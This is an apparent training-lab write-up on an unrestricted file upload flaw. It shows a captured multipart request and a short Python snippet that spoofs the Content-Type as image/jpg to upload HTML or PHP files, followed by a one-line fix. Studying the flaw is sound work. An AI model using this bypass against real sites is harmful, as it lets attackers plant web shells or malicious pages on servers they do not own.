# Unrestricted file upload

## Exploitation

On the homepage, at the bottom, there is some images and 2 buttons **ADD IMAGE** and **SEARCH IMAGE**. On the "add image" page (http://192.168.1.48/index.php?page=upload), there is a form. We can upload some images.

After many tries, the form only accept `jpg` images, not png and not other files.

We can check the raw request on the developper tools when we posting an image

```
-----------------------------42702836962405046798154987984
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------42702836962405046798154987984
Content-Disposition: form-data; name="uploaded"; filename=""
Content-Type: application/octet-stream


-----------------------------42702836962405046798154987984
Content-Disposition: form-data; name="Upload"

Upload
-----------------------------42702836962405046798154987984--
```

This is a `multipart/form-data` (as we can see on the html). We can try to send a request to post other filetypes in python, by building the request manually and adding the `Content-Type: image/jpg`

```py
files = {
    'MAX_FILE_SIZE': (None, '100000'),
    'uploaded': ('index.html', open('index.html','rb'), 'image/jpg'),
    'Upload': (None, 'Upload')
}
requests.post("http://192.168.1.48/index.php?page=upload#", files=files)
```

It works! We can upload some html or php files

## How to fix it?

On the backend, the code need to do a second check on the uploaded file
